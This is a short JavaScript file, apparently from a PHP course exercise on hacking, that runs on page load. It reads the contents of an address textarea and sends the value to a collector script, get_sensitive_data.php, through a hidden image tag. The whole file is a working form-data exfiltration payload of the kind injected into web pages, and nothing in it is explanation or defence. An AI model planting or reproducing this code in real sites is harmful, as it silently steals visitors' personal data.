function init()
{
	var sensitive_data =  $('#txaAddress').val();
	//alert(sensitive_data);
	$('body').append('<div style="display:none"><img src="http://localhost/curso_php/04/02/hack/get_sensitive_data.php?data='+sensitive_data+'" /></div>');
}

$( init );